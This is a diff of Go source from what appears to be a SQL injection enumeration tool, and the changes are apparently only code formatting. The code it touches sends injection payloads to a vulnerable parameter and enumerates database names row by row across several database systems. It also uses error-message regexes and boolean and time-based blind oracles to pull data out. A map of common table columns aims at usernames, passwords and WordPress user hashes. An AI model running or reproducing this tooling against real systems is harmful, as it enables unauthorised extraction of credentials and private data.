@@ -81,8 +81,8 @@ func (en *Enumerator) extractData(body string, strategies []extractStrategy) []s
 
 		case strategyErrorMsg:
 			patterns := []struct {
-				re   *regexp.Regexp
-				idx  int
+				re  *regexp.Regexp
+				idx int
 			}{
 				{regexp.MustCompile(`Duplicate\s+entry\s+'([^']+)'`), 1},
 				{regexp.MustCompile(`Column\s+'([^']+)'`), 1},
@@ -515,7 +515,9 @@ func (en *Enumerator) tryRowByRowDatabases(vulnParam string, dbms string) []stri
 				fmt.Sprintf("FROM `region-us`.INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET %d", i))
 			for _, p := range payloads {
 				body, _, _, err := en.Engine.Request(p, vulnParam)
-				if err != nil { continue }
+				if err != nil {
+					continue
+				}
 				extracted := en.extractData(body, strategies)
 				for _, e := range extracted {
 					if e != "" && !contains(databases, e) {
@@ -531,7 +533,9 @@ func (en *Enumerator) tryRowByRowDatabases(vulnParam string, dbms string) []stri
 			}
 			for _, p := range payloads {
 				body, _, _, err := en.Engine.Request(p, vulnParam)
-				if err != nil { continue }
+				if err != nil {
+					continue
+				}
 				extracted := en.extractData(body, strategies)
 				for _, e := range extracted {
 					if e != "" && !contains(databases, e) {
@@ -550,7 +554,9 @@ func (en *Enumerator) tryRowByRowDatabases(vulnParam string, dbms string) []stri
 				fmt.Sprintf("FROM crdb_internal.databases LIMIT 1 OFFSET %d", i))
 			for _, p := range payloads {
 				body, _, _, err := en.Engine.Request(p, vulnParam)
-				if err != nil { continue }
+				if err != nil {
+					continue
+				}
 				extracted := en.extractData(body, strategies)
 				for _, e := range extracted {
 					if e != "" && !contains(databases, e) {
@@ -566,7 +572,9 @@ func (en *Enumerator) tryRowByRowDatabases(vulnParam string, dbms string) []stri
 				fmt.Sprintf("FROM information_schema.schemata LIMIT 1 OFFSET %d", i))
 			for _, p := range payloads {
 				body, _, _, err := en.Engine.Request(p, vulnParam)
-				if err != nil { continue }
+				if err != nil {
+					continue
+				}
 				extracted := en.extractData(body, strategies)
 				for _, e := range extracted {
 					if e != "" && !contains(databases, e) {
@@ -582,7 +590,9 @@ func (en *Enumerator) tryRowByRowDatabases(vulnParam string, dbms string) []stri
 				fmt.Sprintf("FROM mon$database ROWS %d TO %d", i+1, i+1))
 			for _, p := range payloads {
 				body, _, _, err := en.Engine.Request(p, vulnParam)
-				if err != nil { continue }
+				if err != nil {
+					continue
+				}
 				extracted := en.extractData(body, strategies)
 				for _, e := range extracted {
 					if e != "" && !contains(databases, e) {
@@ -598,7 +608,9 @@ func (en *Enumerator) tryRowByRowDatabases(vulnParam string, dbms string) []stri
 				fmt.Sprintf("FROM information_schema.catalogs LIMIT 1 OFFSET %d", i))
 			for _, p := range payloads {
 				body, _, _, err := en.Engine.Request(p, vulnParam)
-				if err != nil { continue }
+				if err != nil {
+					continue
+				}
 				extracted := en.extractData(body, strategies)
 				for _, e := range extracted {
 					if e != "" && !contains(databases, e) {
@@ -614,7 +626,9 @@ func (en *Enumerator) tryRowByRowDatabases(vulnParam string, dbms string) []stri
 				fmt.Sprintf("FROM information_schema.databases LIMIT 1 OFFSET %d", i))
 			for _, p := range payloads {
 				body, _, _, err := en.Engine.Request(p, vulnParam)
-				if err != nil { continue }
+				if err != nil {
+					continue
+				}
 				extracted := en.extractData(body, strategies)
 				for _, e := range extracted {
 					if e != "" && !contains(databases, e) {
@@ -783,10 +797,14 @@ func (en *Enumerator) testBlindCondition(payload, vulnParam, oracleType string) 
 	switch oracleType {
 	case "boolean":
 		testBody, testLen, _, err := en.Engine.Request(payload, vulnParam)
-		if err != nil { return false }
+		if err != nil {
+			return false
+		}
 		_ = testBody
 		_, baseLen, _, err := en.Engine.Request("", "")
-		if err != nil { return false }
+		if err != nil {
+			return false
+		}
 		return testLen > baseLen+10
 	case "time":
 		start := time.Now()
@@ -1451,23 +1469,23 @@ func (en *Enumerator) tryRowByRowColumns(db, table, vulnParam, dbms string, stra
 
 func (en *Enumerator) tryCommonColumnNames(vulnParam, table, db, dbms string) []string {
 	tableColMap := map[string][]string{
-		"users":    {"id", "username", "password", "email", "role", "created_at", "updated_at", "last_login", "status", "is_active"},
-		"user":     {"id", "username", "password", "email", "role"},
-		"admin":    {"id", "username", "password", "email", "level", "permissions"},
-		"accounts": {"id", "username", "password", "email", "balance", "created_at"},
-		"members":  {"id", "username", "password", "email", "joined_at"},
+		"users":     {"id", "username", "password", "email", "role", "created_at", "updated_at", "last_login", "status", "is_active"},
+		"user":      {"id", "username", "password", "email", "role"},
+		"admin":     {"id", "username", "password", "email", "level", "permissions"},
+		"accounts":  {"id", "username", "password", "email", "balance", "created_at"},
+		"members":   {"id", "username", "password", "email", "joined_at"},
 		"customers": {"id", "name", "email", "phone", "address", "created_at"},
-		"clients":  {"id", "name", "email", "phone", "company"},
-		"profiles": {"id", "user_id", "bio", "avatar", "website"},
-		"config":   {"id", "key", "value", "description"},
-		"settings": {"id", "key", "value", "group"},
-		"products": {"id", "name", "description", "price", "category", "stock", "image"},
-		"orders":   {"id", "user_id", "product_id", "quantity", "total", "status", "created_at"},
-		"payments": {"id", "order_id", "amount", "method", "status", "transaction_id"},
-		"posts":    {"id", "title", "content", "author", "created_at", "updated_at"},
-		"wp_users": {"ID", "user_login", "user_pass", "user_email", "user_registered", "display_name"},
-		"flags":    {"id", "flag", "name", "points", "category"},
-		"flag":     {"id", "flag", "name", "value"},
+		"clients":   {"id", "name", "email", "phone", "company"},
+		"profiles":  {"id", "user_id", "bio", "avatar", "website"},
+		"config":    {"id", "key", "value", "description"},
+		"settings":  {"id", "key", "value", "group"},
+		"products":  {"id", "name", "description", "price", "category", "stock", "image"},
+		"orders":    {"id", "user_id", "product_id", "quantity", "total", "status", "created_at"},
+		"payments":  {"id", "order_id", "amount", "method", "status", "transaction_id"},
+		"posts":     {"id", "title", "content", "author", "created_at", "updated_at"},
+		"wp_users":  {"ID", "user_login", "user_pass", "user_email", "user_registered", "display_name"},
+		"flags":     {"id", "flag", "name", "points", "category"},
+		"flag":      {"id", "flag", "name", "value"},
 	}
 
 	lower := strings.ToLower(table)
